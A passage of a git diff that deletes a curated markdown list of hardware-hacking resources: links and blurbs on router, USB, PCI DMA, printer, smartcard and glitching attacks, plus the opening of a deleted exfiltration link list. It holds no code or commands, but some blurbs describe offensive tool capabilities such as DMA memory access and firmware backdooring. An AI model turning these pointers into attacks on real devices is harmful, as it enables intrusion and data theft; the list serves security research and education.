-* [Printers](#printers)
-* [USB](#USB)
-* [PenTest Dropboxes](#dropbox)
-* [Teensy/Rubberducky Style Attack Tools](#teensy)
-* [SD Cards](#sdcard)
-* [Tutorials/Walkthroughs/Write-ups](#writeups)
-* [USB](#usb)
-* [SmartCards](#smartcard)
-* [Papers](#papers
-
-
-
-
-
-
-
-
-#### To Sort
-[Smart TV Security - #1984 in 21 st century](https://cansecwest.com/slides/2013/SmartTV%20Security.pdf)
-	* This talk is more about security bugs and rootkits than about firmware for TVs. This talk more covers rootkits than security bugs and exploitation thereof, as they?re not different to traditional techniques. This talk is about general security issues of all Smart TV vendors.
-
-http://www.sp3ctr3.me/hardware-security-resources/
-
-http://greatscottgadgets.com/infiltrate2013/
-
-[SPI](https://trmm.net/SPI_flash)
-
-[umap](https://github.com/nccgroup/umap) 
-* The USB host security assessment tool
-
-[Pwn2Win 2017 - Shift Register](http://blog.dragonsector.pl/2017/10/pwn2win-2017-shift-register.html)
-
-[From Zero to ZeroDay Journey: Router Hacking (WRT54GL Linksys Case)](http://www.defensecode.com/whitepapers/From_Zero_To_ZeroDay_Network_Devices_Exploitation.txt)
-* [Ghosts from the Past: Authentication bypass and OEM backdoors in WiMAX routers](http://blog.sec-consult.com/2017/06/ghosts-from-past-authentication-bypass.html)
-
-[Apple Lightning Reverse Engineered](http://ramtin-amin.fr/#tristar)
-
-[Reverse Engineering Intels Management Engine](http://recon.cx/2014/slides/Recon%202014%20Skochinsky.pdf) 
-* On every intel chip core2duo and newer
-
-[ChipWhisperer](http://www.newae.com/chipwhisperer)
-* ChipWhisperer is the first ever open-source solution that provides a complete toolchain for research and analysis of embedded hardware security. Side Channel Power Analysis, Clock Glitching, VCC Glitching, and more are all possible with this unique tool.
-
-Hacking the Dropcam series
-* [Part 1 - Dropcam Comms](http://blog.includesecurity.com/2014/03/Reverse-Engineering-Dropcam-Communications.html)
-* [Part 2 - Rooting the Dropcam](http://blog.includesecurity.com/2014/04/reverse-engineering-dropcam-rooting-the-device.html)
-* [Part 3 - Dropcam Lua Bytecode](http://blog.includesecurity.com/2014/08/Reverse-Engineering-Dropcam-Lua-Bytecode.html)
-
-[Hardware reverse engineering tools (Olivier Thomas)  - REcon 2013](https://www.youtube.com/watch?v=o77GTR8RovM)
-
-[Reverse Engineering: Reverse Engineering Flash Memory for Fun and Benefit - BlackHat 2014](https://www.youtube.com/watch?v=E8BSnS4-Kpw)
-
-
-#### end sort
-
-
-
-
-### <a name="general"></a>General
-* [Reversing and Exploiting Embedded Devices: The Software Stack (Part 1)](https://p16.praetorian.com/blog/reversing-and-exploiting-embedded-devices-part-1-the-software-stack)
-* [Hardware Security and Trust/ECE 4451/5451: Introduction to Hardware Security and Trust](https://www.engr.uconn.edu/~tehrani/teaching/hst/)
-* [NSA Playset](http://www.nsaplayset.org/)
-	* In the coming months and beyond, we will release a series of dead simple, easy to use tools to enable the next generation of security researchers.  We, the security community have learned a lot in the past couple decades, yet the general public is still ill equipped to deal with real threats that face them every day, and ill informed as to what is possible. Inspired by the NSA ANT catalog, we hope the NSA Playset will make cutting edge security tools more accessible, easier to understand, and harder to forget.  Now you can play along with the NSA!
-* [Anti-Evil Maid](http://theinvisiblethings.blogspot.com/2011/09/anti-evil-maid.html?m=1)
-* [Breaking IPMI/BMC](http://fish2.com/ipmi/how-to-break-stuff.html)
-
-
----------------------------
-### <a name="generalwriteups"></a>General Writeups/Articles
-* [Door Control Systems: An Examination of Lines of Attack](https://www.nccgroup.com/en/blog/2013/09/door-control-systems-an-examination-of-lines-of-attack/)
-* [Smart Parking Meters](http://uninformed.org/?v=all&a=6&t=sumry)
-	* Security through obscurity is unfortunately much more common than people think: many interfaces are built on the premise that since they are a "closed system" they can ignore standard security practices. This paper will demonstrate how parking meter smart cards implement their protocol and will point out some weaknesses in their design that open the doors to the system. It will also present schematics and code that you can use to perform these basic techniques for auditing almost any type of blackblox secure memory card. 
-* [Attacks via physical access to USB (DMA??)](https://security.stackexchange.com/questions/118854/attacks-via-physical-access-to-usb-dma)
-* [Can a connected USB device read all data from the USB bus?](https://security.stackexchange.com/questions/37927/can-a-connected-usb-device-read-all-data-from-the-usb-bus?rq=1)
-* [Introduction to Glitch Attacks](https://wiki.newae.com/Tutorial_A2_Introduction_to_Glitch_Attacks_(including_Glitch_Explorer))
-	* This advanced tutorial will demonstrate clock glitch attacks using the ChipWhisperer system. This will introduce you to many required features of the ChipWhisperer system when it comes to glitching. This will be built on in later tutorials to generate voltage glitching attacks, or when you wish to attack other targets. 
-* [Hacking Voting Machines at DEF CON 25](https://blog.horner.tj/post/hacking-voting-machines-def-con-25)
-* [dc25-votingvillage-report - notes from participants](https://github.com/josephlhall/dc25-votingvillage-report/blob/master/notes-from-folks-redact.md)
-* [dc25-votingvillage-report](https://github.com/josephlhall/dc25-votingvillage-report)
-	* A report to synthesize findings from the Defcon 25 Voting Machine Hacking Village
-* [Secure Tokin? & Doobiekeys: How to roll your own counterfeit hardware security devices - @securelyfitz, @r00tkillah](https://media.defcon.org/DEF%20CON%2025/DEF%20CON%2025%20presentations/DEFCON-25-r00killah-and-securelyfitz-Secure-Tokin-and-Doobiekeys.pdf)
-* [Inside a low budget consumer hardware espionage implant](https://ha.cking.ch/s8_data_line_locator/)
-
-
-
-
-
-
----------------------------
-### <a name="generaltalks"></a>General Talks/Presentations
-* [Jackson Thuraisamy & Jason Tran - Hacking POS PoS Systems](https://www.youtube.com/watch?v=-n7oJqmTUCo) 
-* [Hardware Hacking the Easyware Way](http://www.irongeek.com/i.php?page=videos/derbycon6/417-hardware-hacking-the-easyware-way-brian-fehrman)
-	* Interested in hardware hacking but not quite sure where to start? Does the thought of soldering thrill you (or scare you)? Come check out this talk to see just how easy it is to jump into this exciting field of research! Many people and companies use similar models of hardware. Unlike software, these devices rarely receive security updates. Sometimes, used devices are sold without clearing the configurations and important data is left behind. After this talk, you will know how to find hidden interfaces on these devices, start searching for vulnerabilities and sensitive information, and have irresistible urges to go home and tear apart all your old networking equipment. Did we mention...live demo?
-* [Deconstructing the Circuit Board Sandwich DEF CON 22 - Joe Grand aka Kingpin](https://www.youtube.com/watch?v=O8FQZIPkgZM)
-* [Multiplexed Wired Attack Surfaces - Michael Ossmann & Kos - Toorcon15](https://www.youtube.com/watch?v=4QB79921Nlw)
-	* Manufacturers of mobile devices often multiplex several wired interfaces onto a single connector. Some of these interfaces, probably intended for test and development, are still enabled when the devices ship. We'll show you how you can get a shell on a popular mobile phone via its USB port without using a USB connection and we will release an open source tool for exploring multiplexed wired interfaces.
-* [SATELLITE TV RECEIVERS: FROM REMOTE CONTROL TO ROOT SHELL - Sofiane Talmat](https://vimeo.com/album/3682874/video/148910624)
-* [NSA USB Playset - ShmooCon201](https://www.youtube.com/watch?v=eTDBFpLYcGA)
-* [Chip & PIN is Definitely Broken - Defcon 19](https://www.youtube.com/watch?v=JABJlvrZWbY)
-* [Ian Douglas - Creating an Internet of Private Things](https://www.youtube.com/watch?v=4W8SkujOXi4&list=PLuUtcRxSUZUpv2An-RNhjuZSJ5fjY7ghe&index=8)
-	* The next big market push is to have the cool IoT device that?s connected to the internet. As we?ve seen from the Mirai and Switcher hacks, it?s important to embed the appropriate safeguards so that devices are not open to attack. When selecting device components there are things that should be checked for, and when you?re doing the coding and workflows, there are other things that need to be taken in to account. Although security and privacy are close cousins, they?re also different. This talk will be centered around some best security and privacy practices as well as some common errors that should be avoided.
-* [Rooting the MikroTik routers (SHA2017)](https://www.youtube.com/watch?v=KZWGD9fWIcM)
-	* In this talk I describe my journey into reverse engineering parts of MikroTik system to gain access to hardware features and the shell behind the RouterOS that has no ?ls?.
-* [When IoT Attacks: Hacking A Linux-Powered Rifle ](https://www.blackhat.com/docs/us-15/materials/us-15-Sandvik-When-IoT-Attacks-Hacking-A-Linux-Powered-Rifle.pdf)
-
-
-
-
-
-
-
----------------------------
-### <a name="generaltools"></a>General Tools
-* [ThunderGate](http://thundergate.io/)
-	* ThunderGate is a collection of tools for the manipulation of Tigon3 Gigabit Ethernet controllers, with special emphasis on the Broadcom NetLink 57762, such as is found in Apple Thunderbolt Gigabit Ethernet adapters.
-* [Metasploit Hardware Brdige](https://community.rapid7.com/community/transpo-security/blog/2017/02/02/exiting-the-matrix)
-	* [Hardware Bridge API](http://opengarages.org/hwbridge/)
-* [ChipWhisperer](http://www.newae.com/chipwhisperer)
-	* ChipWhisperer is the first ever open-source solution that provides a complete toolchain for research and analysis of embedded hardware security. Side Channel Power Analysis, Clock Glitching, VCC Glitching, and more are all possible with this unique tool.
-
-
-
-
-
----------------------------
-### <a name="routers">Attacking Routers</a>
-* [More on HNAP - What is it, How to Use it, How to Find it](https://isc.sans.edu/diary/More+on+HNAP+-+What+is+it%2C+How+to+Use+it%2C+How+to+Find+it/17648)
-* [Router Post-Exploitation Framework](https://github.com/mncoppola/rpef
-	* Abstracts and expedites the process of backdooring stock firmware images for consumer/SOHO routers.
-* [ASUS Router infosvr UDP Broadcast root Command Execution](https://github.com/jduck/asus-cmd)
-* [Unpacking Firmware images from cable modems](http://w00tsec.blogspot.com.br/2013/11/unpacking-firmware-images-from-cable.html)
-* [From 0-day to exploit ? Buffer overflow in Belkin N750 (CVE-2014-1635)](https://labs.integrity.pt/articles/from-0-day-to-exploit-buffer-overflow-in-belkin-n750-cve-2014-1635/)
-* [Hacking the D-Link DIR-890L](http://www.devttys0.com/2015/04/hacking-the-d-link-dir-890l/)
-* [Multiple Vulnerabilities in BHU WiFi ?uRouter?](http://blog.ioactive.com/2016/08/multiple-vulnerabilities-in-bhu-wifi.html)
-
-
-
-
-
-##### TR-069
-* [I Hunt TR-069 Admins - Pwning ISPs Like a Boss - Defcon 22](https://media.defcon.org/DEF%20CON%2022/DEF%20CON%2022%20video%20and%20slides/DEF%20CON%2022%20Hacking%20Conference%20Presentation%20By%20Shahar%20Tal%20-%20I%20Hunt%20TR%20-%20069%20Admins%20-%20Pwning%20ISPs%20Like%20a%20Boss%20-%20Video%20and%20Slides.m4v)
-* [Related to TR-069](http://blog.3slabs.com/2012/12/a-brief-survey-of-cwmp-security.html)
-
-
-
-
-
-
-
-
-
----------------------------
-### <a name="modem">Cable Modem Hacking</a>
-
-[Docsis hacking](https://www.defcon.org/images/defcon-16/dc16-presentations/defcon-16-self.pdf)
-[Hacking Docsis for fun and profit](https://www.defcon.org/images/defcon-18/dc-18-presentations/Blake-bitemytaco/DEFCON-18-Blake-bitemytaco-Hacking-DOCSIS.pdf)
-
-[Keykeriki v2.0](http://www.remote-exploit.org/articles/keykeriki_v2_0__8211_2_4ghz/index.html)
-* Hardware to attack wireless keyboards and other such things
-
-
-
-
-
-
-
-
-
-
----------------------------
-### <a name="education">Educational</a>
-* [Hardware Hacking for Software People](http://dontstuffbeansupyournose.com/2011/08/25/hardware-hacking-for-software-people/)
-* [Glitching for n00bs - A journey to coax out chips' inner seccrets](http://media.ccc.de/browse/congress/2014/31c3_-_6499_-_en_-_saal_2_-_201412271715_-_glitching_for_n00bs_-_exide.html#video)
-	* Despite claims of its obsolescence, electrical glitching can be a viable attack vector against some ICs. This presentation chronicles a quest to learn what types of electrical transients can be introduced into an integrated circuit to cause a variety of circuit faults advantageous to an reverser. Several hardware platforms were constructed during the quest to aid in research, including old-skool & solderless breadboards, photo-etched & professional PCBs, FPGAs, and cheap & dirty homemade logic analyzers. The strengths and weaknesses of the various approaches will be discussed.
-* [Hardware Hacking Videos](http://vimeo.com/album/1632121)
-* [Serial Peripheral Interface Bus](https://en.wikipedia.org/wiki/Serial_Peripheral_Interface_Bus)
-* [I2C - Inter-Integrated Circuit](https://en.wikipedia.org/wiki/I%C2%B2C)
-* [Display Data Channel](https://en.wikipedia.org/wiki/Display_Data_Channel)
-* [UART - Universal asynchronous receiver/transmitter](https://en.wikipedia.org/wiki/Universal_asynchronous_receiver/transmitter)
-* [Hardware Hacking - Nicolas Collins](http://www.nicolascollins.com/texts/originalhackingmanual.pdf)
-* [Common methods of H/W hacking](https://www.sparkfun.com/news/1314)
-* [Modbus Protocol Overview](https://www.lammertbies.nl/comm/info/modbus.html)
-* [ISO/IEC 7816](https://en.wikipedia.org/wiki/ISO/IEC_7816)
-* [ISO/IEC 15693](https://en.wikipedia.org/wiki/ISO/IEC_15693)
-* [ISO/IEC 14443](https://en.wikipedia.org/wiki/ISO/IEC_14443)
-
-
-
-
-
-
-
----------------------------
-### <a name="flash">Flash Memory</a>
-* [Reverse Engineering Flash Memory for Fun and Benefit - BlackHat 2014](https://www.youtube.com/watch?v=E8BSnS4-Kpw)
-* [Vulnerabilities in MLC NAND Flash Memory Programming: Experimental Analysis, Exploits, and Mitigation Techniques](https://pdfs.semanticscholar.org/b9bc/a3c9f531002854af48de121cdcc8e0520c7f.pdf)
-
-
-
-
-
-
----------------------------
-### <a name="iot">Internet of Things</a>
-* [Smart Nest Thermostat A Smart Spy in Your Home](https://www.youtube.com/watch?v=UFQ9AYMee_Q)
-* [A Primer on IoT Security Research](https://community.rapid7.com/community/infosec/blog/2015/03/10/iot-security-research-whats-it-take)
-* [Security of Things: An Implementers? Guide to Cyber-Security for Internet of Things Devices and Beyond - NCC Group](https://www.nccgroup.com/media/481272/2014-04-09_-_security_of_things_-_an_implementers_guide_to_cyber_security_for_internet_of_things_devices_and_beyond-2.pdf)
-
-
-
-
-
----------------------------
-### <a name="gentools">General Tools(Software & Hardware)</a>
-* [FCC ID Lookup](http://transition.fcc.gov/oet/ea/fccid/)
-	* Lookup devices according to FCC ID
-* [Logic Pirate](http://dangerousprototypes.com/docs/Logic_Pirate)
-	* The Logic Pirate is an inexpensive, yet capable open source logic analyzer. It is designed to support the SUMP logic analyzer protocol. Costs $30. Recommended to me by those who use it.
-	* [Blog Post about it](http://dangerousprototypes.com/2014/04/15/new-prototype-logic-pirate-8-channel-256k-sample-60msps-logic-analyzer/)
-* [JTAGulator](http://www.grandideastudio.com/portfolio/jtagulator/)
-	* JTAGulator is an open source hardware tool that assists in identifying OCD connections from test points, vias, or component pads on a target device.
-
-
-
-
-
-
-
-
-
-
----------------------------
-### <a name="misc">Miscellaneous</a>
-* [Project bdp](http://www.malcolmstagg.com/bdp-s390.html)
-	* This is a project to modify the Sony Blu-ray BDP firmware. It started out with only the BDP-S390, but has branched out to include other players and a variety of goals, including removing Cinavia and obtaining Region-Free.
-* [Learn how to send an SMS text message in Python by pushing a button on your Arduino!](http://juliahgrace.com/intro-hardware-hacking-arduino.html)
-* [U-Boot -- the Universal Boot Loader](http://www.denx.de/wiki/U-Boot)
-	* Very popular on embedded devices open source bootloader for linux
-	* [Manual/Documentation](http://www.denx.de/wiki/DULG/Manual)
-
-
-
-
-
-
----------------------------
-### <a name="pci">PCI</a>
-* [Inception](https://github.com/carmaa/inception)
-	* Inception is a physical memory manipulation and hacking tool exploiting PCI-based DMA. The tool can attack over FireWire, Thunderbolt, ExpressCard, PC Card and any other PCI/PCIe interfaces. Inception aims to provide a relatively quick, stable and easy way of performing intrusive and non-intrusive memory hacks against live computers using DMA.
-* [Stupid PCIe Tricks featuring NSA Playset: PCIe](https://www.youtube.com/watch?v=Zwz61uVxiM0)
-* [PCILeech](https://github.com/ufrisk/pcileech)
-	* The PCILeech use the USB3380 chip in order to read from and write to the memory of a target system. This is achieved by using DMA over PCI Express. No drivers are needed on the target system. The USB3380 is only able to read 4GB of memory natively, but is able to read all memory if a kernel module (KMD) is first inserted into the target system kernel. Reading 8GB of memory from the target system take around one (1) minute. The PCILeech hardware is connected with USB3 to a controlling computer running the PCILeech program. PCILeech is also capable of inserting a wide range of kernel modules into the targeted kernels - allowing for pulling and pushing files, remove the logon password requirement, loading unsigned drivers, executing code and spawn system shells. The software is written in visual studio and runs on Windows 7/Windows 10. Supported target systems are currently the x64 versions of: Linux, FreeBSD, macOS and Windows.
-
-
-
-----------------------
-### Printers
-* [Hacking Printers Wiki](http://hacking-printers.net/wiki/index.php/Main_Page)
-* [Attacking *multifunction* printers and getting creds from them](http://www.irongeek.com/i.php?page=videos/bsidescleveland2014/plunder-pillage-and-print-the-art-of-leverage-multifunction-printers-during-penetration-testing-deral-heiland)
-* [PRET](https://github.com/RUB-NDS/PRET)
-	* PRET is a new tool for printer security testing developed in the scope of a Master's Thesis at Ruhr University Bochum. It connects to a device via network or USB and exploits the features of a given printer language. Currently PostScript, PJL and PCL are supported which are spoken by most laser printers. This allows cool stuff like capturing or manipulating print jobs, accessing the printer's file system and memory or even causing physical damage to the device. All attacks are documented in detail in the Hacking Printers Wiki.
-* [HPwn - HP printer security research code](https://github.com/foxglovesec/HPwn)
-	* This repository contains varios scripts and projects referenced in FoxGlove security's HP printer blogpost.
-
----------------------------
-### <a name="USB">USB</a>
-* [USBProxy](https://github.com/dominicgs/USBProxy)
-	* A USB man in the middle device using USB On-The-Go, libUSB and gadgetFS 
-* [Implementing an USB Host Driver Fuzzer - Daniel Mende - Troopers14](https://www.youtube.com/watch?v=h777lF6xjs4)
-* [WHID Injector: an USB-Rubberducky/BadUSB on Steroids](https://whid-injector.blogspot.lt/2017/04/whid-injector-how-to-bring-hid-attacks.html)
-* [Introduction to USB and Fuzzing - Matt DuHarte - Defcon23](https://www.youtube.com/watch?v=KWOTXypBt4E)
-* [Attacks via physical access to USB (DMA??)](https://security.stackexchange.com/questions/118854/attacks-via-physical-access-to-usb-dma)
-* [Can a connected USB device read all data from the USB bus?](https://security.stackexchange.com/questions/37927/can-a-connected-usb-device-read-all-data-from-the-usb-bus?rq=1)
-
-
-
-
-
-
-
----------------------------
-### <a name="dropbox">Pentesting Drop Boxes</a>
-Minipwner
-
-
-Pineapple
-
-
-R00tabaga
-
-Raspi
-http://crushbeercrushcode.org/2013/03/developing-the-rogue-pi/
-http://www.instructables.com/id/MyLittlePwny-Make-a-self-powered-pentesting-box-/
-https://github.com/pwnieexpress/raspberry_pwn
-
-
-
-
-
-
-
-
-
----------------------------
-### <a name="teensy">Teensy/Rubbery Ducky Style Attacks/Etc</a>
-* [USB teensy attack set OSX](http://samy.pl/usbdriveby/)
-* [Paensy](https://github.com/Ozuru/Paensy)
-	* Paensy is a combination of the word payload and Teensy - Paensy is an attacker-oriented library written for the development of Teensy devices. Paensy simplifies mundane tasks and allows an easier platform for scripting.
-	* [Blogpost](http://malware.cat/?p=89)
-
-
-
-
-
----------------------------
-### <a name="sdcard">SD Cards</a>
-* [The Exploration and Exploitation of an SD Memory Card](https://www.youtube.com/watch?v=Tj-zI8Tl218)
-	* This talk demonstrates a method for reverse engineering and loading code into the microcontroller within a SD memory card.
-
-
----------------------------
-### <a name="writeups">Tutorials/Walkthroughs/Write-ups</a>
-* [Methodologies for Hacking Embedded Security Appliances](https://media.blackhat.com/us-13/US-13-Bathurst-Methodologies-for-Hacking-Embdded-Security-Appliances-Slides.pdf)
-* [Reversing D-Links WPS pin algorithm](http://www.devttys0.com/2014/10/reversing-d-links-wps-pin-algorithm/)
-* [Firmware Forensics: Diffs, Timelines, ELFs and Backdoors](http://w00tsec.blogspot.com/2015/02/firmware-forensics-diffs-timelines-elfs.html)
-* [Disk Genie - SpritesMods](http://spritesmods.com/?art=diskgenie)
-* [DRIVE IT YOURSELF: USB CAR](http://www.linuxvoice.com/drive-it-yourself-usb-car-6/)
-* Reversing USB and writing USB Drivers for an RC car.
-* [Debug Probes - J-Link and J-Trace](https://www.segger.com/jlink-debug-probes.html)
-* [Analyzing and Running binaries from Firmware Images - Part 1](http://w00tsec.blogspot.com.br/2013/09/analyzing-and-running-binaries-from.html)
-* [Jailbreaks and Pirate Tractors: Reverse Engineering Do?s and Don?ts](https://www.youtube.com/watch?v=8_mMTVsOM6Y)
-* [Lost your "secure" HDD PIN? We can help!](https://syscall.eu/pdf/2016-Lenoir_Rigo-HDD_PIN-paper.pdf)
-
-
-
-
-
-
----------------------------
-### <a name="usb">USB</a>
-* [USB in a Nutshell](http://www.beyondlogic.org/usbnutshell/usb1.shtml)
-	* Great explanation of the USB standard in depth
-* [USB Device Drivers: A Stepping Stone into your Kernel](https://www.youtube.com/watch?v=HQWFHskIY2)
-	* [Slides])(www.jodeit.org/research/DeepSec2009_USB_Device_Drivers.pdf)
-* [Lowering the USB Fuzzing Barrier by Transparent Two-Way Emulation](https://www.usenix.org/system/files/conference/woot14/woot14-vantonder.pdf)
-	* Abstract: Increased focus on the Universal Serial Bus (USB) attack surface of devices has recently resulted in a number of new vulnerabilities. Much of this advance has been aided by the advent of hardware-based USB emulation techniques. However, existing tools and methods are far from ideal, requiring a significant investment of time, money, and effort. In this work, we present a USB testing framework that improves significantly over existing methods in providing a cost-effective and flexible way to read and modify USB communication. Amongst other benefits, the framework enables man-in-the-middle fuzz testing between a host and peripheral. We achieve this by performing two-way emulation using inexpensive bespoke USB testing hardware, thereby delivering capa-bilities of a USB analyzer at a tenth of the cost. Mutational fuzzing is applied during live communication between a host and peripheral, yielding new security-relevant bugs. Lastly, we comment on the potential of the framework to improve current exploitation techniques on the USB channel.
-* [USB For All - Defcon 22 - Jesse Michael and Mickey Shkatov](https://www.youtube.com/watch?v=7HnQnpJwr-c)
-	* USB is used in almost every computing device produced in recent years. In addition to well-known usages like keyboard, mouse, and mass storage, a much wider range of capabilities exist such as Device Firmware Update, USB On-The-Go, debug over USB, and more. What actually happens on the wire? Is there interesting data we can observe or inject into these operations that we can take advantage of? In this talk, we will present an overview of USB and its corresponding attack surface. We will demonstrate different tools and methods that can be used to monitor and abuse USB for malicious purposes.
-
-
-##### BadUSB
-* [Slides](https://srlabs.de/blog/wp-content/uploads/2014/11/SRLabs-BadUSB-Pacsec-v2.pdf)
-* [Video](https://www.youtube.com/watch?v=nuruzFqMgIw)
-* [Code - Psychson](https://github.com/adamcaudill/Psychson) 
-* [Media Transfer Protocol and USB device Research](http://nicoleibrahim.com/part-1-mtp-and-ptp-usb-device-research/)
-
-
-##### USB Class Info
-* [USB Device Class Specifications - Official Site](http://www.usb.org/developers/docs/devclass_docs/)
-	* These specifications recommend design targets for classes of devices. For HID related information, please go to the [HID web page.](http://www.usb.org/developers/docs/docs/hidpage/)
-* [Universal Serial Bus Device Class Specification for Device Firmware Upgrade Version 1.1 Aug 5, 2004](http://www.usb.org/developers/docs/devclass_docs/DFU_1.1.pdf)
-* [USB Attacks Need Physical Access Right? Not Any More? by Andy Davis](https://www.youtube.com/watch?v=90MIjgh5ESU)
-* [Phison PS2303 (PS2251-03) framework](https://bitbucket.org/flowswitch/phison)
-	* This project's goal is to turn PS2303-based USB flash drive into a cheap USB 3.0 development platform (i.e. fast USB 3.0 to FPGA bridge).
-
-
-
----------------------------
-### SIM Cards
-* [Rooting SIM cards](https://www.youtube.com/watch?v=BR0yWjQYnhQ)
-* [The Secret Life of SIM Cards - Karl Koscher/Eric Butler](https://www.youtube.com/watch?v=_-nxemBCcmU)
-* [Hacking a USB Modem & SIM](http://blog.ptsecurity.com/2014/12/4g-security-hacking-usb-modem-and-sim.html)
-
-
----------------------------
-### <a name="smartcard">Smartcards</a>
-* [ISO/IEC 7816](https://en.wikipedia.org/wiki/ISO/IEC_7816)
-* [ISO/IEC 15693](https://en.wikipedia.org/wiki/ISO/IEC_15693)
-* [ISO/IEC 14443](https://en.wikipedia.org/wiki/ISO/IEC_14443)
-* [How can I do that? Intro to hardware hacking with an RFID badge reader - Kevin Bong](http://www.irongeek.com/i.php?page=videos/derbycon3/3303-how-can-i-do-that-intro-to-hardware-hacking-with-an-rfid-badge-reader-kevin-bong)
-* [An analysis of the vulnerabilities introduced with Java Card 3 Connected Edition](http://www.ma.rhul.ac.uk/static/techrep/2013/MA-2013-04.pdf)
-* [Introduction to Smart Card Security](http://resources.infosecinstitute.com/introduction-smartcard-security/)
-
-Chameleon Mini 
-* [Chameleon: A Versatile Emulator for Contactless Smartcards - Paper](https://www.ei.rub.de/media/crypto/veroeffentlichungen/2011/11/16/chameleon.pdf)
-* [Milking the Digital Cash Cow [29c3] Video Presentation](https://www.youtube.com/watch?v=Y1o2ST03O8I)
-* [ChameleonMini Hardware](https://github.com/emsec/ChameleonMini/wiki)
-
-
-
-
-
-
-
----------------------------
-### <a name="papers">General Papers</a>
-* [Stealthy Dopant-Level Hardware Trojans](Hardware level trojans http://sharps.org/wp-content/uploads/BECKER-CHES.pdf)
-	* Abstract: In this paper we propose an extremely stealthy approach for implement- ing hardware Trojans below the gate level, and we evaluate their impact on the security of the target device. Instead of adding additional cir- cuitry to the target design, we insert our hardware Trojans by changing the dopant polarity of existing transistors. Since the modi ed circuit ap- pears legitimate on all wiring layers (including all metal and polysilicon), our family of Trojans is resistant to most detection techniques, includ- ing ne-grain optical inspection and checking against \golden chips". We demonstrate the e ectiveness of our approach by inserting Trojans into two designs | a digital post-processing derived from Intel's cryp- tographically secure RNG design used in the Ivy Bridge processors and a side-channel resistant SBox implementation | and by exploring their detectability and their e ects on security.
-* [Perimeter-Crossing Buses: a New Attack Surface for
-Embedded Systems](http://www.cs.dartmouth.edu/~sws/pubs/bgjss12.pdf)
-	* Abstract: This paper maps out the bus-facing attack surface of a modern operating system, and demonstrates that effective and effcient injection of traffc into the buses is real and easily a ordable. Further, it presents a simple and inexpen-sive hardware tool for the job, outlining the architectural and computation-theoretic challenges to creating a defensive OS/driver architecture comparable to that which has been achieved for network stacks.
-* [Implementation and Implications of a Stealth Hard-Drive Backdoor](https://www.ibr.cs.tu-bs.de/users/kurmus/papers/acsac13.pdf) 
-	* Modern workstations and servers implicitly trust hard disks to act as well-behaved block devices. This paper analyzes the catastrophic loss of security that occurs when hard disks are not trustworthy. First, we show that it is possible to compromise the firmware of a commercial ovt-the-shelf hard drive, by resorting only to public information and reverse engineering. Using such a compromised firmware, we present a stealth rootkit that replaces arbitrary blocks from the disk while they are written, providing a data replacement back- door . The measured performance overhead of the compromised disk drive is less than 1% compared with a normal, non-malicious disk drive. We then demonstrate that a re- mote attacker can even establish a communication channel with a compromised disk to infiltrate commands and to ex-filtrate data. In our example, this channel is established over the Internet to an unmodified web server that relies on the compromised drive for its storage, passing through the original webserver, database server, database storage engine, filesystem driver, and block device driver. Additional experiments, performed in an emulated disk-drive environment, could automatically extract sensitive data such as /etc/shadow (or a secret key le) in less than a minute. This paper claims that the diffculty of implementing such an at- tack is not limited to the area of government cyber-warfare; rather, it is well within the reach of moderately funded criminals, botnet herders and academic researchers.
-* [Flipping Bits in Memory Without Accessing Them: An Experimental Study of DRAM Disturbance Errors](https://www.ece.cmu.edu/~safari/pubs/kim-isca14.pdf)
-	* Abstract. Memory isolation is a key property of a reliable and secure computing system ? an access to one memory ad- dress should not have unintended side e ects on data stored in other addresses. However, as DRAM process technology scales down to smaller dimensions, it becomes more diffcult to prevent DRAM cells from electrically interacting with each other. In this paper, we expose the vulnerability of commodity DRAM chips to disturbance errors. By reading from the same address in DRAM, we show that it is possible to corrupt data in nearby addresses. More specifically, activating the same row in DRAM corrupts data in nearby rows. We demonstrate this phenomenon on Intel and AMD systems using a malicious program that generates many DRAM accesses. We induce errors in most DRAM modules (110 out of 129) from three major DRAM manufacturers. From this we conclude that many deployed systems are likely to be at risk. We identify the root cause of disturbance errors as the repeated toggling of a DRAM row?s wordline, which stresses inter-cell coupling e ects that accelerate charge leakage from nearby rows. We provide an extensive characterization study of disturbance errors and their behavior using an FPGA-based testing plat- form. Among our key findings, we show that (i) it takes as few as 139K accesses to induce an error and (ii) up to one in every 1.7K cells is susceptible to errors. After examining var- ious potential ways of addressing the problem, we propose a low-overhead solution to prevent the errors.
-* [Adapting Software Fault Isolation to Contemporary CPU Architectures](https://static.googleusercontent.com/media/research.google.com/en/us/pubs/archive/35649.pdf)
-	* Software Fault Isolation (SFI) is an effective approach to sandboxing binary code of questionable provenance, an interesting use case for native plugins in a Web browser. We present software fault isolation schemes for ARM and x86-64 that provide control-flow and memory integrity with average performance overhead of under 5% on ARM and 7% on x86-64. We believe these are the best known SFI implementations for these architectures, with significantly lower overhead than previous systems for similar architectures. Our experience suggests that these SFI implementations benefit from instruction-level parallelism, and have particularly small impact for work- loads that are data memory-bound, both properties that tend to reduce the impact of our SFI systems for future CPU implementations.
-* [Introduction to Trusted Execution  Environments - Steven J. Murdoch](https://www.cl.cam.ac.uk/~sjm217/talks/rhul14tee.pdf)
-* [The Sorcerer?s Apprentice Guide to Fault Attacks](https://eprint.iacr.org/2004/100.pdf)
-	* The effect of faults on electronic systems has been studied since the 1970s when it was noticed that radioactive particles caused errors in chips. This led to further research on the effect of charged particles on silicon, motivated by the aerospace industry who was becoming concerned about the effect of faults in airborne electronic systems. Since then various mechanisms for fault creation and propagation have been discovered and researched. This paper covers the various methods that can be used to induce faults in semiconductors and exploit such errors maliciously. Several examples of attacks stemming from the exploiting of faults are explained. Finally a series of countermeasures to thwart these attacks are described.
-
-
diff --git a/Draft/Exfiltration.md b/Draft/Exfiltration.md
deleted file mode 100755
index 1dcc11d..0000000
--- a/Draft/Exfiltration.md
+++ /dev/null
@@ -1,107 +0,0 @@
-# Exfiltration
-
-
-### TOC
-
-* [General](#general)
-* [Methodologies](#methods)
-* [Writeups](#writeups)
-* [Tools](#tools)
-* [Papers](#papers)
-
-
-##### Cull
-
-
-
-##### End cull
------
-### <a name="general">General</a>
-* [HowTo: Data Exfiltration - windowsir.blogspot](https://windowsir.blogspot.com/2013/07/howto-data-exfiltration.html)
-* [Covert Channels in TCP/IP Protocol Stack - extended version-](https://eprints.ugd.edu.mk/10284/1/surveyAMBPselfArc.pdf)
-* [A Survey of Covert Channels and Countermeasures in Computer Network Protocols](http://caia.swin.edu.au/cv/szander/publications/szander-ieee-comst07.pdf)
